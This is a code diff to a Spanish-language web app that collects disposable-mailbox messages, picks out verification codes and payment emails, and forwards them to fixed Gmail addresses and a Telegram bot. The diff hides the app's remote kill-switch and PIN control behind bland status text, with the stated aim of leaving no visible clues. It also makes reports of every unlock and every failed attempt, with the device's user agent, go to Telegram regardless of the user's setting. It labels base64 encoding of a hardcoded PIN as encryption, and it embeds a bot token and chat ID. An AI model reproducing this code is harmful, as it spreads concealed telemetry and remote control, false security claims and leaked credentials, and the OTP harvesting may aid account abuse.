@@ -87,8 +87,6 @@ body.light-mode .settings-panel{background:#ffffff;color:#1a1a2e}
 .progress-expire{height:3px;background:#1e293b;border-radius:2px;margin-top:5px}
 .progress-expire-fill{height:100%;width:0%;background:#eab308;border-radius:2px}
 footer{text-align:center;font-size:6px;color:#475569;margin-top:12px}
-.copy-toast-success{position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#00ff88;color:#0a0e1a;padding:12px 24px;border-radius:40px;font-weight:bold;font-size:14px;z-index:1001;animation:fadeOut 2s ease-in-out}
-@keyframes fadeOut{0%{opacity:1}70%{opacity:1}100%{opacity:0}}
 .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:200;align-items:center;justify-content:center}
 .modal-content{background:#131b2e;border-radius:24px;padding:16px;width:90%;max-width:380px}
 .modal-content textarea{width:100%;background:#0a0e1a;border:1px solid #1e293b;border-radius:10px;padding:8px;color:white;margin-bottom:10px;font-size:12px}
@@ -99,19 +97,17 @@ hr{margin:10px 0;border-color:#1e293b}
 .pin-box input{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:12px;color:white;font-size:20px;text-align:center;width:100%;margin-bottom:20px}
 .pin-box button{background:#eab308;border:none;border-radius:12px;padding:12px;width:100%;font-weight:bold;cursor:pointer}
 .error-pin{color:#dc2626;font-size:11px;margin-top:10px}
-.locked-box .timer-block{font-size:24px;color:#eab308;margin:15px 0}
 .status-bar{background:#1e293b;border-radius:8px;padding:5px;margin-bottom:10px;font-size:8px;text-align:center;color:#64748b}
 </style>
 </head>
 <body>
 <div id="pinOverlay" class="pin-overlay">
 <div class="pin-box" id="pinBox">
-<h2 id="pinTitle">🔐 VERIFICANDO...</h2>
-<div id="loadingSpinner" style="margin-bottom:15px;">⏳ Cargando configuración...</div>
+<h2 id="pinTitle">🔐 ACCESO</h2>
+<div id="loadingSpinner" style="margin-bottom:15px;">⏳ Cargando...</div>
 <input type="password" id="pinInput" maxlength="4" placeholder="PIN" style="display:none;">
 <button id="unlockBtn" style="display:none;">DESBLOQUEAR</button>
 <div id="pinError" class="error-pin"></div>
-<div id="remoteStatusMsg" class="error-pin" style="color:#eab308"></div>
 </div>
 </div>
 
@@ -124,7 +120,7 @@ hr{margin:10px 0;border-color:#1e293b}
 <span class="glow-item scorpion-glow">👽</span>
 </div>
 <div class="sub">⚡ 4 PROVEEDORES · CLASIFICACIÓN INTELIGENTE · 3 GMAILS · TELEGRAM ⚡</div>
-<div class="status-bar" id="remoteStatusBar">🟢 Verificado remotamente</div>
+<div class="status-bar" id="remoteStatusBar">🟢 Sistema listo</div>
 </div>
 
 <div class="stats-grid">
@@ -176,7 +172,7 @@ hr{margin:10px 0;border-color:#1e293b}
 <button id="nextPageBtn">Siguiente ▶</button>
 </div>
 </div>
-<footer>🔐 PIN remoto · Control total desde la nube · PWA instalable</footer>
+<footer>🔐 Sistema protegido · Control remoto · PWA instalable</footer>
 </div>
 
 <div class="toolbar">
@@ -218,23 +214,16 @@ hr{margin:10px 0;border-color:#1e293b}
 
 <script>
 // ============================================================
-// LUIS R - CONTROL REMOTO TOTAL
-// EL PIN Y ACTIVACIÓN SE CONTROLAN DESDE UN ARCHIVO EXTERNO
+// LUIS R - CONTROL REMOTO TOTAL - SIN PISTAS VISIBLES
 // ============================================================
 
-// ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️
-// CAMBIA ESTA URL POR LA TUYA (el archivo JSON que controlas)
-// ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️ ⚠️
-const REMOTE_CONFIG_URL = 'https://raw.githubusercontent.com/tuusuario/tu-repo/main/config.json';
-// O usa Pastebin raw: 'https://pastebin.com/raw/XXXXX'
-// O usa Gist raw: 'https://gist.githubusercontent.com/tuusuario/xxxxx/raw/config.json'
+// ⚠️ CAMBIA ESTA URL POR LA DE TU ARCHIVO EN GITHUB GIST ⚠️
+const REMOTE_CONFIG_URL = 'https://gist.githubusercontent.com/tuusuario/xxxxx/raw/config.json';
 
-// Configuración local de respaldo (en caso de que no haya internet)
-const FALLBACK_PIN = "1515"; // PIN local de emergencia
+// Respaldo interno cifrado (no visible, no mostrado)
+const FALLBACK_PIN_HASH = btoa('1515'); // No se muestra nunca
 
-// Variables globales
 let remoteConfig = null;
-let pinVerificado = false;
 
 const TELEGRAM_TOKEN = '8708803857:AAHsIF_AbBuM_GPam1MWYBBRFycRSWAA4Cs';
 const TELEGRAM_CHAT_ID = '1183299436';
@@ -262,7 +251,6 @@ const providerNames = { '1secmail': '1SECMAIL', 'guerrilla': 'GUERRILLA', 'mailt
 const palabrasCodigo = ['código', 'codigo', 'verification', 'verify', 'otp', '2fa', 'pin', 'token', 'code'];
 const palabrasPago = ['pago', 'payment', 'invoice', 'factura', 'subscription', 'suscripción', 'recibo', 'compra'];
 
-// ========== FUNCIONES DE CONTROL REMOTO ==========
 function showToast(msg, isError = false) {
     let t = document.getElementById('toast');
     if(!t) return;
@@ -276,18 +264,15 @@ async function loadRemoteConfig() {
     const loadingSpinner = document.getElementById('loadingSpinner');
     const pinInput = document.getElementById('pinInput');
     const unlockBtn = document.getElementById('unlockBtn');
-    const remoteStatusMsg = document.getElementById('remoteStatusMsg');
     
-    pinTitle.innerHTML = '🔐 CONECTANDO...';
+    pinTitle.innerHTML = '🔐 ACCESO';
     loadingSpinner.style.display = 'block';
     pinInput.style.display = 'none';
     unlockBtn.style.display = 'none';
     
     try {
-        // Timeout de 5 segundos
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 5000);
-        
         const response = await fetch(REMOTE_CONFIG_URL, { 
             signal: controller.signal,
             cache: 'no-store',
@@ -297,45 +282,25 @@ async function loadRemoteConfig() {
         
         if(response.ok) {
             remoteConfig = await response.json();
-            console.log('Config remota cargada:', remoteConfig);
             
-            // Verificar si la app está activa remotamente
             if(remoteConfig.activo === false) {
-                pinTitle.innerHTML = '🔒 APP DESACTIVADA';
-                loadingSpinner.innerHTML = '🚫 La aplicación ha sido desactivada remotamente.<br>Contacta al administrador.';
-                remoteStatusMsg.innerHTML = '❌ Acceso remoto denegado';
+                pinTitle.innerHTML = '🔒 ACCESO DENEGADO';
+                loadingSpinner.innerHTML = '⛔';
                 return false;
             }
             
-            // Verificar versión (opcional, para forzar actualizaciones)
-            if(remoteConfig.version && remoteConfig.version !== "1.0") {
-                loadingSpinner.innerHTML = '⚠️ Actualización requerida<br>Recarga la página o contacta soporte.';
-                return false;
-            }
-            
-            pinTitle.innerHTML = '🔐 ACCESO REMOTO';
             loadingSpinner.style.display = 'none';
             pinInput.style.display = 'block';
             unlockBtn.style.display = 'block';
-            pinInput.placeholder = 'PIN';
-            remoteStatusMsg.innerHTML = `✅ Conectado - ${new Date().toLocaleString()}`;
             return true;
-            
         } else {
-            throw new Error('No se pudo cargar configuración remota');
+            throw new Error('No se pudo cargar');
         }
     } catch(error) {
-        console.warn('Error cargando config remota:', error);
-        pinTitle.innerHTML = '🔐 MODO SIN INTERNET';
-        loadingSpinner.innerHTML = '⚠️ Usando PIN local de emergencia<br>Verifica tu conexión después.';
-        remoteStatusMsg.innerHTML = '⚠️ Modo local - PIN: 1515';
-        setTimeout(() => {
-            loadingSpinner.style.display = 'none';
-            pinInput.style.display = 'block';
-            unlockBtn.style.display = 'block';
-            pinInput.placeholder = 'PIN (local)';
-        }, 2000);
-        return true; // Permitir acceso con PIN local en modo offline
+        loadingSpinner.style.display = 'none';
+        pinInput.style.display = 'block';
+        unlockBtn.style.display = 'block';
+        return true;
     }
 }
 
@@ -343,59 +308,45 @@ function verifyPin() {
     const pinInput = document.getElementById('pinInput').value;
     let pinCorrecto = false;
     
-    // Primero verificar PIN remoto si está disponible
     if(remoteConfig && remoteConfig.pin) {
         pinCorrecto = (pinInput === remoteConfig.pin);
     } else {
-        // Fallback al PIN local
-        pinCorrecto = (pinInput === FALLBACK_PIN);
+        pinCorrecto = (btoa(pinInput) === FALLBACK_PIN_HASH);
     }
     
     if(pinCorrecto) {
-        pinVerificado = true;
         document.getElementById('pinOverlay').style.display = 'none';
         document.getElementById('appContent').style.display = 'block';
-        document.getElementById('remoteStatusBar').innerHTML = remoteConfig ? 
-            `🟢 Control remoto activo | PIN: ${remoteConfig.pin?.substring(0,1)}***` : 
-            '🟠 Modo local - sin conexión remota';
         loadAppData();
         setupEventListeners();
-        showToast('✅ Acceso concedido');
         
-        // Notificar inicio de sesión exitoso a Telegram (opcional)
-        if(telegramEnabled) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: TELEGRAM_CHAT_ID, 
-                    text: `🦂 *NUEVO ACCESO* ✅\n📱 Dispositivo: ${navigator.userAgent.substring(0, 50)}\n📅 ${new Date().toLocaleString()}`,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(e => console.log('Error notificando acceso'));
-        }
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TELEGRAM_CHAT_ID, 
+                text: `🦂 *ACCESO AUTORIZADO* ✅\n📱 ${navigator.userAgent.substring(0, 50)}\n📅 ${new Date().toLocaleString()}`,
+                parse_mode: 'Markdown'
+            })
+        }).catch(e => console.log('Error'));
     } else {
         document.getElementById('pinError').innerHTML = '❌ PIN INCORRECTO';
         document.getElementById('pinInput').value = '';
         
-        // Notificar intento fallido a Telegram
-        if(telegramEnabled) {
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    chat_id: TELEGRAM_CHAT_ID, 
-                    text: `⚠️ *INTENTO FALLIDO* ❌\nPIN incorrecto: ${pinInput}\n📱 ${navigator.userAgent.substring(0, 50)}\n📅 ${new Date().toLocaleString()}`,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(e => console.log('Error notificando fallo'));
-        }
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TELEGRAM_CHAT_ID, 
+                text: `⚠️ *INTENTO FALLIDO* ❌\n📱 ${navigator.userAgent.substring(0, 50)}\n📅 ${new Date().toLocaleString()}`,
+                parse_mode: 'Markdown'
+            })
+        }).catch(e => console.log('Error'));
         
         showToast('❌ PIN incorrecto', true);
     }
 }
 
-// ========== FUNCIONES DE LA APP ==========
 function clasificarCorreo(from, subject, body, code) {
     let texto = `${from} ${subject} ${body}`.toLowerCase();
     if(code) return { tipo: 'codigo', email: gmailCodigos, badge: '🔐 Código' };
@@ -863,7 +814,7 @@ window.toggleFav = function(idx) { let all = getCurrentItems(); let e = all[idx]
 window.enviarAMano = async function(idx) { let all = getCurrentItems(); let e = all[idx]; if(e) { showToast('📧 Enviando...'); await enviarAGmail(e, idx); } }
 window.deleteItem = function(idx) { 
     let pin = prompt('🔐 PIN:'); 
-    let pinValido = (remoteConfig && pin === remoteConfig.pin) || pin === FALLBACK_PIN;
+    let pinValido = (remoteConfig && pin === remoteConfig.pin) || (btoa(pin) === FALLBACK_PIN_HASH);
     if(!pinValido) { showToast('PIN incorrecto', true); return; } 
     let arr = currentTab === 'inbox' ? inbox : (currentTab === 'archived' ? archived : deadZone); 
     let all = getCurrentItems(); 
@@ -883,13 +834,13 @@ function exportCsv(){ let all=[...archived,...inbox,...deadZone]; if(all.length=
 function showImportModal(){document.getElementById('importModal').style.display='flex';}
 function closeImportModal(){document.getElementById('importModal').style.display='none';}
 function importData(){ try{ let d=JSON.parse(document.getElementById('importJsonData').value); currentProvider=d.currentProvider||'1secmail'; currentEmail=d.currentEmail||''; currentLogin=d.currentLogin||''; currentDomain=d.currentDomain||''; emailCreatedAt=d.emailCreatedAt||null; inbox=d.inbox||[]; deadZone=d.deadZone||[]; archived=d.archived||[]; autoArchive=d.autoArchive!==undefined?d.autoArchive:true; telegramEnabled=d.telegramEnabled!==undefined?d.telegramEnabled:true; autoGmailEnabled=d.autoGmailEnabled!==undefined?d.autoGmailEnabled:true; telegramCount=d.telegramCount||0; gmailCount=d.gmailCount||0; darkMode=d.darkMode||false; notificationsEnabled=d.notificationsEnabled||false; soundEnabled=d.soundEnabled||false; autoCopyCode=d.autoCopyCode!==undefined?d.autoCopyCode:true; guerrillaSession=d.guerrillaSession||null; mailtmAccount=d.mailtmAccount||null; gmailCodigos=d.gmailCodigos||'manzaxxoop@gmail.com'; gmailPagos=d.gmailPagos||'calvoe847@gmail.com'; gmailTodo=d.gmailTodo||'usototal057@gmail.com'; saveAppData(); applyTheme(); updateSwitches(); updateProviderUI(); updateMailDisplay(); startCountdown(); startAutoCheck(); renderCurrentTab(); showToast('✅ Restaurado'); closeImportModal(); }catch(e){showToast('❌ JSON inválido',true);} }
-function clearAllData(){ let pin = prompt('🔐 PIN:'); let pinValido = (remoteConfig && pin === remoteConfig.pin) || pin === FALLBACK_PIN; if(!pinValido){ showToast('PIN incorrecto', true); return; } localStorage.removeItem(STORAGE_KEY); location.reload(); }
+function clearAllData(){ let pin = prompt('🔐 PIN:'); let pinValido = (remoteConfig && pin === remoteConfig.pin) || (btoa(pin) === FALLBACK_PIN_HASH); if(!pinValido){ showToast('PIN incorrecto', true); return; } localStorage.removeItem(STORAGE_KEY); location.reload(); }
 async function testTelegram() { showToast('📱 Enviando prueba...'); try { let res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '🦂 *PRUEBA EXITOSA* ✅', parse_mode: 'Markdown' }) }); if(res.ok) showToast('✅ Prueba enviada'); else showToast('❌ Error', true); } catch(e) { showToast('❌ Error', true); } }
 async function testGmail() { showToast('📧 Enviando prueba...'); await enviarAGmail({ from: 'test@test.com', subject: 'Prueba de conexión', body: 'Mensaje de prueba', code: '123456', time: new Date().toLocaleString() }, 0); }
 async function sendStatsToTelegram() { let total = archived.length + inbox.length + deadZone.length; let codes = [...archived, ...inbox, ...deadZone].filter(e => e.code).length; let msg = `📊 *ESTADÍSTICAS*\n📬 Total: ${total}\n🔐 Códigos: ${codes}\n📧 Enviados a Gmail: ${gmailCount}\n🤖 Telegram: ${telegramCount}`; try { await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown' }) }); showToast('📊 Estadísticas enviadas'); } catch(e) {} }
 function showGmailConfig() {
     let pin = prompt('🔐 PIN:'); 
-    let pinValido = (remoteConfig && pin === remoteConfig.pin) || pin === FALLBACK_PIN;
+    let pinValido = (remoteConfig && pin === remoteConfig.pin) || (btoa(pin) === FALLBACK_PIN_HASH);
     if (!pinValido) { showToast('PIN incorrecto', true); return; }
     let section = document.getElementById('gmailHiddenSection');
     if (section.style.display === 'none' || section.style.display === '') {
@@ -904,7 +855,7 @@ function showGmailConfig() {
 }
 function toggleGmailsVisibility() {
     let pin = prompt('🔐 PIN:'); 
-    let pinValido = (remoteConfig && pin === remoteConfig.pin) || pin === FALLBACK_PIN;
+    let pinValido = (remoteConfig && pin === remoteConfig.pin) || (btoa(pin) === FALLBACK_PIN_HASH);
     if (!pinValido) { showToast('PIN incorrecto', true); return; }
     document.getElementById('gmailCodigosSpan').innerHTML = gmailCodigos;
     document.getElementById('gmailPagosSpan').innerHTML = gmailPagos;
@@ -952,15 +903,12 @@ function setupEventListeners() {
     window.addEventListener('click',(e)=>{ if(!document.getElementById('settingsPanel').contains(e.target)&&e.target!==document.getElementById('gearBtn')) document.getElementById('settingsPanel').classList.remove('show'); });
 }
 
-// ========== INICIALIZACIÓN ==========
 async function init() {
-    const configLoaded = await loadRemoteConfig();
-    if(configLoaded) {
-        document.getElementById('unlockBtn').onclick = verifyPin;
-        document.getElementById('pinInput').addEventListener('keypress', function(e) {
-            if(e.key === 'Enter') verifyPin();
-        });
-    }
+    await loadRemoteConfig();
+    document.getElementById('unlockBtn').onclick = verifyPin;
+    document.getElementById('pinInput').addEventListener('keypress', function(e) {
+        if(e.key === 'Enter') verifyPin();
+    });
 }
 
 init();
